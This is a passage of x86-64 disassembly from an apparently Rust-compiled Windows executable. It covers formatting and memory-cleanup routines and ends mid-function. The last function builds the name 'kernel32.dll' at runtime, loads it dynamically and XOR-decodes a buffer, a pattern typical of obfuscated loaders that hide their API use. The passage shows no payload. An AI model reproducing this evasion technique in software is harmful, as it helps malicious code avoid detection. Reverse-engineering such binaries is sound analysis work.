   140001721:	45 0f b6 0c 09       	movzbl (%r9,%rcx,1),%r9d
   140001726:	46 88 4c 04 2f       	mov    %r9b,0x2f(%rsp,%r8,1)
   14000172b:	4d 8d 48 ff          	lea    -0x1(%r8),%r9
   14000172f:	41 80 fa 0f          	cmp    $0xf,%r10b
   140001733:	77 db                	ja     0x140001710
   140001735:	49 83 c0 fe          	add    $0xfffffffffffffffe,%r8
   140001739:	4a 8d 04 04          	lea    (%rsp,%r8,1),%rax
   14000173d:	48 83 c0 31          	add    $0x31,%rax
   140001741:	eb 3e                	jmp    0x140001781
   140001743:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140001749:	48 8d 0d 90 ed 0d 00 	lea    0xded90(%rip),%rcx        # 0x1400e04e0
   140001750:	4d 89 c8             	mov    %r9,%r8
   140001753:	44 0f b6 d0          	movzbl %al,%r10d
   140001757:	c0 e8 04             	shr    $0x4,%al
   14000175a:	45 89 d1             	mov    %r10d,%r9d
   14000175d:	41 83 e1 0f          	and    $0xf,%r9d
   140001761:	45 0f b6 0c 09       	movzbl (%r9,%rcx,1),%r9d
   140001766:	46 88 4c 04 34       	mov    %r9b,0x34(%rsp,%r8,1)
   14000176b:	4d 8d 48 ff          	lea    -0x1(%r8),%r9
   14000176f:	41 80 fa 0f          	cmp    $0xf,%r10b
   140001773:	77 db                	ja     0x140001750
   140001775:	49 83 c0 fe          	add    $0xfffffffffffffffe,%r8
   140001779:	4a 8d 04 04          	lea    (%rsp,%r8,1),%rax
   14000177d:	48 83 c0 36          	add    $0x36,%rax
   140001781:	b9 03 00 00 00       	mov    $0x3,%ecx
   140001786:	4c 29 c9             	sub    %r9,%rcx
   140001789:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000178e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001793:	4c 8d 05 d4 fa 0d 00 	lea    0xdfad4(%rip),%r8        # 0x1400e126e
   14000179a:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400017a0:	48 89 d1             	mov    %rdx,%rcx
   1400017a3:	b2 01                	mov    $0x1,%dl
   1400017a5:	e8 b6 92 00 00       	call   0x14000aa60
   1400017aa:	90                   	nop
   1400017ab:	48 83 c4 38          	add    $0x38,%rsp
   1400017af:	c3                   	ret
   1400017b0:	41 57                	push   %r15
   1400017b2:	41 56                	push   %r14
   1400017b4:	41 55                	push   %r13
   1400017b6:	41 54                	push   %r12
   1400017b8:	56                   	push   %rsi
   1400017b9:	57                   	push   %rdi
   1400017ba:	55                   	push   %rbp
   1400017bb:	53                   	push   %rbx
   1400017bc:	48 83 ec 58          	sub    $0x58,%rsp
   1400017c0:	48 89 d6             	mov    %rdx,%rsi
   1400017c3:	48 8b 01             	mov    (%rcx),%rax
   1400017c6:	48 8b 78 08          	mov    0x8(%rax),%rdi
   1400017ca:	4c 8b 60 10          	mov    0x10(%rax),%r12
   1400017ce:	48 8b 0a             	mov    (%rdx),%rcx
   1400017d1:	48 8b 42 08          	mov    0x8(%rdx),%rax
   1400017d5:	48 8d 15 e4 f9 0d 00 	lea    0xdf9e4(%rip),%rdx        # 0x1400e11c0
   1400017dc:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400017e2:	ff 50 18             	call   *0x18(%rax)
   1400017e5:	89 c1                	mov    %eax,%ecx
   1400017e7:	4d 85 e4             	test   %r12,%r12
   1400017ea:	0f 84 9c 00 00 00    	je     0x14000188c
   1400017f0:	b0 01                	mov    $0x1,%al
   1400017f2:	84 c9                	test   %cl,%cl
   1400017f4:	0f 85 8a 00 00 00    	jne    0x140001884
   1400017fa:	f6 46 12 80          	testb  $0x80,0x12(%rsi)
   1400017fe:	75 16                	jne    0x140001816
   140001800:	48 89 f9             	mov    %rdi,%rcx
   140001803:	48 89 f2             	mov    %rsi,%rdx
   140001806:	e8 35 fe ff ff       	call   0x140001640
   14000180b:	49 83 fc 01          	cmp    $0x1,%r12
   14000180f:	74 79                	je     0x14000188a
   140001811:	e9 c5 00 00 00       	jmp    0x1400018db
   140001816:	48 8b 1e             	mov    (%rsi),%rbx
   140001819:	4c 8b 76 08          	mov    0x8(%rsi),%r14
   14000181d:	48 8d 15 60 00 0e 00 	lea    0xe0060(%rip),%rdx        # 0x1400e1884
   140001824:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000182a:	48 89 d9             	mov    %rbx,%rcx
   14000182d:	41 ff 56 18          	call   *0x18(%r14)
   140001831:	89 c1                	mov    %eax,%ecx
   140001833:	b0 01                	mov    $0x1,%al
   140001835:	84 c9                	test   %cl,%cl
   140001837:	75 4b                	jne    0x140001884
   140001839:	c6 44 24 27 01       	movb   $0x1,0x27(%rsp)
   14000183e:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001843:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140001848:	48 8d 44 24 27       	lea    0x27(%rsp),%rax
   14000184d:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001852:	48 8b 46 10          	mov    0x10(%rsi),%rax
   140001856:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000185b:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140001860:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001865:	48 8d 05 8c ec 0d 00 	lea    0xdec8c(%rip),%rax        # 0x1400e04f8
   14000186c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001871:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140001876:	48 89 f9             	mov    %rdi,%rcx
   140001879:	e8 c2 fd ff ff       	call   0x140001640
   14000187e:	84 c0                	test   %al,%al
   140001880:	74 39                	je     0x1400018bb
   140001882:	b0 01                	mov    $0x1,%al
   140001884:	49 83 fc 01          	cmp    $0x1,%r12
   140001888:	75 51                	jne    0x1400018db
   14000188a:	89 c1                	mov    %eax,%ecx
   14000188c:	b0 01                	mov    $0x1,%al
   14000188e:	84 c9                	test   %cl,%cl
   140001890:	75 17                	jne    0x1400018a9
   140001892:	48 8b 0e             	mov    (%rsi),%rcx
   140001895:	48 8b 46 08          	mov    0x8(%rsi),%rax
   140001899:	48 8d 15 21 f9 0d 00 	lea    0xdf921(%rip),%rdx        # 0x1400e11c1
   1400018a0:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400018a6:	ff 50 18             	call   *0x18(%rax)
   1400018a9:	90                   	nop
   1400018aa:	48 83 c4 58          	add    $0x58,%rsp
   1400018ae:	5b                   	pop    %rbx
   1400018af:	5d                   	pop    %rbp
   1400018b0:	5f                   	pop    %rdi
   1400018b1:	5e                   	pop    %rsi
   1400018b2:	41 5c                	pop    %r12
   1400018b4:	41 5d                	pop    %r13
   1400018b6:	41 5e                	pop    %r14
   1400018b8:	41 5f                	pop    %r15
   1400018ba:	c3                   	ret
   1400018bb:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400018c0:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400018c5:	48 8d 15 24 ec 0d 00 	lea    0xdec24(%rip),%rdx        # 0x1400e04f0
   1400018cc:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400018d2:	ff 50 18             	call   *0x18(%rax)
   1400018d5:	49 83 fc 01          	cmp    $0x1,%r12
   1400018d9:	74 af                	je     0x14000188a
   1400018db:	48 ff c7             	inc    %rdi
   1400018de:	49 ff cc             	dec    %r12
   1400018e1:	48 8d 1d 1d f9 0d 00 	lea    0xdf91d(%rip),%rbx        # 0x1400e1205
   1400018e8:	4c 8d 6c 24 27       	lea    0x27(%rsp),%r13
   1400018ed:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   1400018f2:	4c 8d 3d ff eb 0d 00 	lea    0xdebff(%rip),%r15        # 0x1400e04f8
   1400018f9:	4c 8d 74 24 28       	lea    0x28(%rsp),%r14
   1400018fe:	eb 1e                	jmp    0x14000191e
   140001900:	b1 01                	mov    $0x1,%cl
   140001902:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001909:	1f 84 00 00 00 00 00 
   140001910:	48 ff c7             	inc    %rdi
   140001913:	89 c8                	mov    %ecx,%eax
   140001915:	49 ff cc             	dec    %r12
   140001918:	0f 84 6e ff ff ff    	je     0x14000188c
   14000191e:	b1 01                	mov    $0x1,%cl
   140001920:	a8 01                	test   $0x1,%al
   140001922:	75 ec                	jne    0x140001910
   140001924:	f6 46 12 80          	testb  $0x80,0x12(%rsi)
   140001928:	75 26                	jne    0x140001950
   14000192a:	48 8b 0e             	mov    (%rsi),%rcx
   14000192d:	48 8b 46 08          	mov    0x8(%rsi),%rax
   140001931:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001937:	48 89 da             	mov    %rbx,%rdx
   14000193a:	ff 50 18             	call   *0x18(%rax)
   14000193d:	b1 01                	mov    $0x1,%cl
   14000193f:	84 c0                	test   %al,%al
   140001941:	75 cd                	jne    0x140001910
   140001943:	48 89 f9             	mov    %rdi,%rcx
   140001946:	48 89 f2             	mov    %rsi,%rdx
   140001949:	e8 f2 fc ff ff       	call   0x140001640
   14000194e:	eb 52                	jmp    0x1400019a2
   140001950:	0f 10 06             	movups (%rsi),%xmm0
   140001953:	c6 44 24 27 01       	movb   $0x1,0x27(%rsp)
   140001958:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   14000195d:	4c 89 6c 24 50       	mov    %r13,0x50(%rsp)
   140001962:	48 8b 46 10          	mov    0x10(%rsi),%rax
   140001966:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000196b:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140001970:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140001975:	48 89 f9             	mov    %rdi,%rcx
   140001978:	4c 89 f2             	mov    %r14,%rdx
   14000197b:	e8 c0 fc ff ff       	call   0x140001640
   140001980:	84 c0                	test   %al,%al
   140001982:	0f 85 78 ff ff ff    	jne    0x140001900
   140001988:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000198d:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140001992:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001998:	48 8d 15 51 eb 0d 00 	lea    0xdeb51(%rip),%rdx        # 0x1400e04f0
   14000199f:	ff 50 18             	call   *0x18(%rax)
   1400019a2:	89 c1                	mov    %eax,%ecx
   1400019a4:	e9 67 ff ff ff       	jmp    0x140001910
   1400019a9:	cc                   	int3
   1400019aa:	cc                   	int3
   1400019ab:	cc                   	int3
   1400019ac:	cc                   	int3
   1400019ad:	cc                   	int3
   1400019ae:	cc                   	int3
   1400019af:	cc                   	int3
   1400019b0:	56                   	push   %rsi
   1400019b1:	48 83 ec 50          	sub    $0x50,%rsp
   1400019b5:	48 89 d6             	mov    %rdx,%rsi
   1400019b8:	8b 42 10             	mov    0x10(%rdx),%eax
   1400019bb:	a9 00 00 00 02       	test   $0x2000000,%eax
   1400019c0:	75 40                	jne    0x140001a02
   1400019c2:	a9 00 00 00 04       	test   $0x4000000,%eax
   1400019c7:	75 7b                	jne    0x140001a44
   1400019c9:	48 8b 09             	mov    (%rcx),%rcx
   1400019cc:	48 8d 54 24 3c       	lea    0x3c(%rsp),%rdx
   1400019d1:	e8 2a 9f 00 00       	call   0x14000b900
   1400019d6:	b9 14 00 00 00       	mov    $0x14,%ecx
   1400019db:	48 29 c1             	sub    %rax,%rcx
   1400019de:	48 01 e0             	add    %rsp,%rax
   1400019e1:	48 83 c0 3c          	add    $0x3c,%rax
   1400019e5:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400019ea:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400019ef:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400019f5:	48 89 f1             	mov    %rsi,%rcx
   1400019f8:	b2 01                	mov    $0x1,%dl
   1400019fa:	45 31 c9             	xor    %r9d,%r9d
   1400019fd:	e9 b0 00 00 00       	jmp    0x140001ab2
   140001a02:	48 8b 09             	mov    (%rcx),%rcx
   140001a05:	ba 11 00 00 00       	mov    $0x11,%edx
   140001a0a:	48 8d 05 c7 fa 0d 00 	lea    0xdfac7(%rip),%rax        # 0x1400e14d8
   140001a11:	49 89 c9             	mov    %rcx,%r9
   140001a14:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001a1b:	00 00 00 00 00 
   140001a20:	49 89 d0             	mov    %rdx,%r8
   140001a23:	89 ca                	mov    %ecx,%edx
   140001a25:	83 e2 0f             	and    $0xf,%edx
   140001a28:	49 c1 e9 04          	shr    $0x4,%r9
   140001a2c:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
   140001a30:	42 88 54 04 3a       	mov    %dl,0x3a(%rsp,%r8,1)
   140001a35:	49 8d 50 ff          	lea    -0x1(%r8),%rdx
   140001a39:	48 83 f9 0f          	cmp    $0xf,%rcx
   140001a3d:	4c 89 c9             	mov    %r9,%rcx
   140001a40:	77 de                	ja     0x140001a20
   140001a42:	eb 3e                	jmp    0x140001a82
   140001a44:	48 8b 09             	mov    (%rcx),%rcx
   140001a47:	ba 11 00 00 00       	mov    $0x11,%edx
   140001a4c:	48 8d 05 8d ea 0d 00 	lea    0xdea8d(%rip),%rax        # 0x1400e04e0
   140001a53:	49 89 c9             	mov    %rcx,%r9
   140001a56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001a5d:	00 00 00 
   140001a60:	49 89 d0             	mov    %rdx,%r8
   140001a63:	89 ca                	mov    %ecx,%edx
   140001a65:	83 e2 0f             	and    $0xf,%edx
   140001a68:	49 c1 e9 04          	shr    $0x4,%r9
   140001a6c:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
   140001a70:	42 88 54 04 3a       	mov    %dl,0x3a(%rsp,%r8,1)
   140001a75:	49 8d 50 ff          	lea    -0x1(%r8),%rdx
   140001a79:	48 83 f9 0f          	cmp    $0xf,%rcx
   140001a7d:	4c 89 c9             	mov    %r9,%rcx
   140001a80:	77 de                	ja     0x140001a60
   140001a82:	49 83 c0 fe          	add    $0xfffffffffffffffe,%r8
   140001a86:	4a 8d 04 04          	lea    (%rsp,%r8,1),%rax
   140001a8a:	48 83 c0 3c          	add    $0x3c,%rax
   140001a8e:	b9 11 00 00 00       	mov    $0x11,%ecx
   140001a93:	48 29 d1             	sub    %rdx,%rcx
   140001a96:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001a9b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001aa0:	4c 8d 05 c7 f7 0d 00 	lea    0xdf7c7(%rip),%r8        # 0x1400e126e
   140001aa7:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140001aad:	48 89 f1             	mov    %rsi,%rcx
   140001ab0:	b2 01                	mov    $0x1,%dl
   140001ab2:	e8 a9 8f 00 00       	call   0x14000aa60
   140001ab7:	90                   	nop
   140001ab8:	48 83 c4 50          	add    $0x50,%rsp
   140001abc:	5e                   	pop    %rsi
   140001abd:	c3                   	ret
   140001abe:	cc                   	int3
   140001abf:	cc                   	int3
   140001ac0:	56                   	push   %rsi
   140001ac1:	57                   	push   %rdi
   140001ac2:	53                   	push   %rbx
   140001ac3:	48 83 ec 70          	sub    $0x70,%rsp
   140001ac7:	48 89 ce             	mov    %rcx,%rsi
   140001aca:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   140001acf:	48 8b 41 48          	mov    0x48(%rcx),%rax
   140001ad3:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001ad8:	0f 10 41 28          	movups 0x28(%rcx),%xmm0
   140001adc:	0f 10 49 38          	movups 0x38(%rcx),%xmm1
   140001ae0:	0f 29 4c 24 50       	movaps %xmm1,0x50(%rsp)
   140001ae5:	0f 29 44 24 40       	movaps %xmm0,0x40(%rsp)
   140001aea:	0f 10 01             	movups (%rcx),%xmm0
   140001aed:	0f 10 49 10          	movups 0x10(%rcx),%xmm1
   140001af1:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   140001af6:	0f 29 4c 24 30       	movaps %xmm1,0x30(%rsp)
   140001afb:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001b00:	e8 4b f6 ff ff       	call   0x140001150
   140001b05:	48 89 f9             	mov    %rdi,%rcx
   140001b08:	e8 f3 f8 ff ff       	call   0x140001400
   140001b0d:	48 8b 76 20          	mov    0x20(%rsi),%rsi
   140001b11:	48 83 7e 18 00       	cmpq   $0x0,0x18(%rsi)
   140001b16:	74 40                	je     0x140001b58
   140001b18:	48 8b 7e 20          	mov    0x20(%rsi),%rdi
   140001b1c:	48 85 ff             	test   %rdi,%rdi
   140001b1f:	74 37                	je     0x140001b58
   140001b21:	48 8b 5e 28          	mov    0x28(%rsi),%rbx
   140001b25:	48 8b 03             	mov    (%rbx),%rax
   140001b28:	48 85 c0             	test   %rax,%rax
   140001b2b:	74 05                	je     0x140001b32
   140001b2d:	48 89 f9             	mov    %rdi,%rcx
   140001b30:	ff d0                	call   *%rax
   140001b32:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
   140001b37:	74 1f                	je     0x140001b58
   140001b39:	48 83 7b 10 11       	cmpq   $0x11,0x10(%rbx)
   140001b3e:	72 04                	jb     0x140001b44
   140001b40:	48 8b 7f f8          	mov    -0x8(%rdi),%rdi
   140001b44:	ff 15 86 f7 01 00    	call   *0x1f786(%rip)        # 0x1400212d0
   140001b4a:	48 89 c1             	mov    %rax,%rcx
   140001b4d:	31 d2                	xor    %edx,%edx
   140001b4f:	49 89 f8             	mov    %rdi,%r8
   140001b52:	ff 15 70 f7 01 00    	call   *0x1f770(%rip)        # 0x1400212c8
   140001b58:	48 c7 46 18 01 00 00 	movq   $0x1,0x18(%rsi)
   140001b5f:	00 
   140001b60:	48 c7 46 20 00 00 00 	movq   $0x0,0x20(%rsi)
   140001b67:	00 
   140001b68:	f0 48 ff 0e          	lock decq (%rsi)
   140001b6c:	75 0f                	jne    0x140001b7d
   140001b6e:	48 89 f1             	mov    %rsi,%rcx
   140001b71:	48 83 c4 70          	add    $0x70,%rsp
   140001b75:	5b                   	pop    %rbx
   140001b76:	5f                   	pop    %rdi
   140001b77:	5e                   	pop    %rsi
   140001b78:	e9 03 d2 01 00       	jmp    0x14001ed80
   140001b7d:	90                   	nop
   140001b7e:	48 83 c4 70          	add    $0x70,%rsp
   140001b82:	5b                   	pop    %rbx
   140001b83:	5f                   	pop    %rdi
   140001b84:	5e                   	pop    %rsi
   140001b85:	c3                   	ret
   140001b86:	cc                   	int3
   140001b87:	cc                   	int3
   140001b88:	cc                   	int3
   140001b89:	cc                   	int3
   140001b8a:	cc                   	int3
   140001b8b:	cc                   	int3
   140001b8c:	cc                   	int3
   140001b8d:	cc                   	int3
   140001b8e:	cc                   	int3
   140001b8f:	cc                   	int3
   140001b90:	41 57                	push   %r15
   140001b92:	41 56                	push   %r14
   140001b94:	41 55                	push   %r13
   140001b96:	41 54                	push   %r12
   140001b98:	56                   	push   %rsi
   140001b99:	57                   	push   %rdi
   140001b9a:	55                   	push   %rbp
   140001b9b:	53                   	push   %rbx
   140001b9c:	48 83 ec 28          	sub    $0x28,%rsp
   140001ba0:	48 89 ce             	mov    %rcx,%rsi
   140001ba3:	48 83 79 28 00       	cmpq   $0x0,0x28(%rcx)
   140001ba8:	74 18                	je     0x140001bc2
   140001baa:	48 8b 7e 30          	mov    0x30(%rsi),%rdi
   140001bae:	ff 15 1c f7 01 00    	call   *0x1f71c(%rip)        # 0x1400212d0
   140001bb4:	48 89 c1             	mov    %rax,%rcx
   140001bb7:	31 d2                	xor    %edx,%edx
   140001bb9:	49 89 f8             	mov    %rdi,%r8
   140001bbc:	ff 15 06 f7 01 00    	call   *0x1f706(%rip)        # 0x1400212c8
   140001bc2:	48 8d 7e 18          	lea    0x18(%rsi),%rdi
   140001bc6:	48 89 f9             	mov    %rdi,%rcx
   140001bc9:	e8 42 c9 01 00       	call   0x14001e510
   140001bce:	48 8b 46 18          	mov    0x18(%rsi),%rax
   140001bd2:	48 85 c0             	test   %rax,%rax
   140001bd5:	74 0e                	je     0x140001be5
   140001bd7:	f0 48 ff 08          	lock decq (%rax)
   140001bdb:	75 08                	jne    0x140001be5
   140001bdd:	48 89 f9             	mov    %rdi,%rcx
   140001be0:	e8 6b ca 01 00       	call   0x14001e650
   140001be5:	48 8b 7e 08          	mov    0x8(%rsi),%rdi
   140001be9:	4c 8b 76 10          	mov    0x10(%rsi),%r14
   140001bed:	4d 85 f6             	test   %r14,%r14
   140001bf0:	74 5e                	je     0x140001c50
   140001bf2:	4c 8d 7f 08          	lea    0x8(%rdi),%r15
   140001bf6:	4c 8b 25 d3 f6 01 00 	mov    0x1f6d3(%rip),%r12        # 0x1400212d0
   140001bfd:	4c 8b 2d c4 f6 01 00 	mov    0x1f6c4(%rip),%r13        # 0x1400212c8
   140001c04:	eb 21                	jmp    0x140001c27
   140001c06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001c0d:	00 00 00 
   140001c10:	41 ff d4             	call   *%r12
   140001c13:	48 89 c1             	mov    %rax,%rcx
   140001c16:	31 d2                	xor    %edx,%edx
   140001c18:	49 89 d8             	mov    %rbx,%r8
   140001c1b:	41 ff d5             	call   *%r13
   140001c1e:	49 83 c7 10          	add    $0x10,%r15
   140001c22:	49 ff ce             	dec    %r14
   140001c25:	74 29                	je     0x140001c50
   140001c27:	49 8b 5f f8          	mov    -0x8(%r15),%rbx
   140001c2b:	49 8b 2f             	mov    (%r15),%rbp
   140001c2e:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140001c32:	48 85 c0             	test   %rax,%rax
   140001c35:	74 05                	je     0x140001c3c
   140001c37:	48 89 d9             	mov    %rbx,%rcx
   140001c3a:	ff d0                	call   *%rax
   140001c3c:	48 83 7d 08 00       	cmpq   $0x0,0x8(%rbp)
   140001c41:	74 db                	je     0x140001c1e
   140001c43:	48 83 7d 10 11       	cmpq   $0x11,0x10(%rbp)
   140001c48:	72 c6                	jb     0x140001c10
   140001c4a:	48 8b 5b f8          	mov    -0x8(%rbx),%rbx
   140001c4e:	eb c0                	jmp    0x140001c10
   140001c50:	48 83 3e 00          	cmpq   $0x0,(%rsi)
   140001c54:	74 14                	je     0x140001c6a
   140001c56:	ff 15 74 f6 01 00    	call   *0x1f674(%rip)        # 0x1400212d0
   140001c5c:	48 89 c1             	mov    %rax,%rcx
   140001c5f:	31 d2                	xor    %edx,%edx
   140001c61:	49 89 f8             	mov    %rdi,%r8
   140001c64:	ff 15 5e f6 01 00    	call   *0x1f65e(%rip)        # 0x1400212c8
   140001c6a:	48 8b 46 20          	mov    0x20(%rsi),%rax
   140001c6e:	f0 48 ff 08          	lock decq (%rax)
   140001c72:	75 19                	jne    0x140001c8d
   140001c74:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
   140001c78:	48 83 c4 28          	add    $0x28,%rsp
   140001c7c:	5b                   	pop    %rbx
   140001c7d:	5d                   	pop    %rbp
   140001c7e:	5f                   	pop    %rdi
   140001c7f:	5e                   	pop    %rsi
   140001c80:	41 5c                	pop    %r12
   140001c82:	41 5d                	pop    %r13
   140001c84:	41 5e                	pop    %r14
   140001c86:	41 5f                	pop    %r15
   140001c88:	e9 f3 d0 01 00       	jmp    0x14001ed80
   140001c8d:	90                   	nop
   140001c8e:	48 83 c4 28          	add    $0x28,%rsp
   140001c92:	5b                   	pop    %rbx
   140001c93:	5d                   	pop    %rbp
   140001c94:	5f                   	pop    %rdi
   140001c95:	5e                   	pop    %rsi
   140001c96:	41 5c                	pop    %r12
   140001c98:	41 5d                	pop    %r13
   140001c9a:	41 5e                	pop    %r14
   140001c9c:	41 5f                	pop    %r15
   140001c9e:	c3                   	ret
   140001c9f:	cc                   	int3
   140001ca0:	56                   	push   %rsi
   140001ca1:	57                   	push   %rdi
   140001ca2:	53                   	push   %rbx
   140001ca3:	48 83 ec 20          	sub    $0x20,%rsp
   140001ca7:	48 8b 31             	mov    (%rcx),%rsi
   140001caa:	89 f0                	mov    %esi,%eax
   140001cac:	83 e0 03             	and    $0x3,%eax
   140001caf:	83 f8 01             	cmp    $0x1,%eax
   140001cb2:	74 08                	je     0x140001cbc
   140001cb4:	48 83 c4 20          	add    $0x20,%rsp
   140001cb8:	5b                   	pop    %rbx
   140001cb9:	5f                   	pop    %rdi
   140001cba:	5e                   	pop    %rsi
   140001cbb:	c3                   	ret
   140001cbc:	48 8b 7e ff          	mov    -0x1(%rsi),%rdi
   140001cc0:	48 8b 5e 07          	mov    0x7(%rsi),%rbx
   140001cc4:	48 8b 03             	mov    (%rbx),%rax
   140001cc7:	48 85 c0             	test   %rax,%rax
   140001cca:	74 05                	je     0x140001cd1
   140001ccc:	48 89 f9             	mov    %rdi,%rcx
   140001ccf:	ff d0                	call   *%rax
   140001cd1:	48 ff ce             	dec    %rsi
   140001cd4:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
   140001cd9:	74 1f                	je     0x140001cfa
   140001cdb:	48 83 7b 10 11       	cmpq   $0x11,0x10(%rbx)
   140001ce0:	72 04                	jb     0x140001ce6
   140001ce2:	48 8b 7f f8          	mov    -0x8(%rdi),%rdi
   140001ce6:	ff 15 e4 f5 01 00    	call   *0x1f5e4(%rip)        # 0x1400212d0
   140001cec:	48 89 c1             	mov    %rax,%rcx
   140001cef:	31 d2                	xor    %edx,%edx
   140001cf1:	49 89 f8             	mov    %rdi,%r8
   140001cf4:	ff 15 ce f5 01 00    	call   *0x1f5ce(%rip)        # 0x1400212c8
   140001cfa:	ff 15 d0 f5 01 00    	call   *0x1f5d0(%rip)        # 0x1400212d0
   140001d00:	48 89 c1             	mov    %rax,%rcx
   140001d03:	31 d2                	xor    %edx,%edx
   140001d05:	49 89 f0             	mov    %rsi,%r8
   140001d08:	48 83 c4 20          	add    $0x20,%rsp
   140001d0c:	5b                   	pop    %rbx
   140001d0d:	5f                   	pop    %rdi
   140001d0e:	5e                   	pop    %rsi
   140001d0f:	48 ff 25 b2 f5 01 00 	rex.W jmp *0x1f5b2(%rip)        # 0x1400212c8
   140001d16:	cc                   	int3
   140001d17:	cc                   	int3
   140001d18:	cc                   	int3
   140001d19:	cc                   	int3
   140001d1a:	cc                   	int3
   140001d1b:	cc                   	int3
   140001d1c:	cc                   	int3
   140001d1d:	cc                   	int3
   140001d1e:	cc                   	int3
   140001d1f:	cc                   	int3
   140001d20:	56                   	push   %rsi
   140001d21:	48 83 ec 20          	sub    $0x20,%rsp
   140001d25:	48 83 39 00          	cmpq   $0x0,(%rcx)
   140001d29:	74 1e                	je     0x140001d49
   140001d2b:	48 8b 71 08          	mov    0x8(%rcx),%rsi
   140001d2f:	ff 15 9b f5 01 00    	call   *0x1f59b(%rip)        # 0x1400212d0
   140001d35:	48 89 c1             	mov    %rax,%rcx
   140001d38:	31 d2                	xor    %edx,%edx
   140001d3a:	49 89 f0             	mov    %rsi,%r8
   140001d3d:	48 83 c4 20          	add    $0x20,%rsp
   140001d41:	5e                   	pop    %rsi
   140001d42:	48 ff 25 7f f5 01 00 	rex.W jmp *0x1f57f(%rip)        # 0x1400212c8
   140001d49:	90                   	nop
   140001d4a:	48 83 c4 20          	add    $0x20,%rsp
   140001d4e:	5e                   	pop    %rsi
   140001d4f:	c3                   	ret
   140001d50:	41 57                	push   %r15
   140001d52:	41 56                	push   %r14
   140001d54:	41 54                	push   %r12
   140001d56:	56                   	push   %rsi
   140001d57:	57                   	push   %rdi
   140001d58:	55                   	push   %rbp
   140001d59:	53                   	push   %rbx
   140001d5a:	48 83 ec 50          	sub    $0x50,%rsp
   140001d5e:	44 89 c5             	mov    %r8d,%ebp
   140001d61:	48 89 d3             	mov    %rdx,%rbx
   140001d64:	49 89 cf             	mov    %rcx,%r15
   140001d67:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140001d6c:	e8 cf 7f 01 00       	call   0x140019d40
   140001d71:	48 85 c0             	test   %rax,%rax
   140001d74:	0f 84 0a 02 00 00    	je     0x140001f84
   140001d7a:	48 b9 6b 65 72 6e 65 	movabs $0x32336c656e72656b,%rcx
   140001d81:	6c 33 32 
   140001d84:	48 89 08             	mov    %rcx,(%rax)
   140001d87:	c7 40 08 2e 64 6c 6c 	movl   $0x6c6c642e,0x8(%rax)
   140001d8e:	48 c7 44 24 30 0c 00 	movq   $0xc,0x30(%rsp)
   140001d95:	00 00 
   140001d97:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001d9c:	48 c7 44 24 40 0c 00 	movq   $0xc,0x40(%rsp)
   140001da3:	00 00 
   140001da5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001daa:	e8 b1 7c 00 00       	call   0x140009a60
   140001daf:	48 89 c6             	mov    %rax,%rsi
   140001db2:	48 89 d7             	mov    %rdx,%rdi
   140001db5:	48 89 c1             	mov    %rax,%rcx
   140001db8:	ff 15 da f4 01 00    	call   *0x1f4da(%rip)        # 0x140021298
   140001dbe:	48 85 c0             	test   %rax,%rax
   140001dc1:	0f 84 74 01 00 00    	je     0x140001f3b
   140001dc7:	49 89 c6             	mov    %rax,%r14
   140001dca:	48 89 d9             	mov    %rbx,%rcx
   140001dcd:	e8 6e 7f 01 00       	call   0x140019d40
   140001dd2:	48 85 c0             	test   %rax,%rax
   140001dd5:	0f 84 b8 01 00 00    	je     0x140001f93
   140001ddb:	89 d9                	mov    %ebx,%ecx
   140001ddd:	83 e1 0c             	and    $0xc,%ecx
   140001de0:	41 0f b6 17          	movzbl (%r15),%edx
   140001de4:	40 30 ea             	xor    %bpl,%dl
   140001de7:	88 10                	mov    %dl,(%rax)
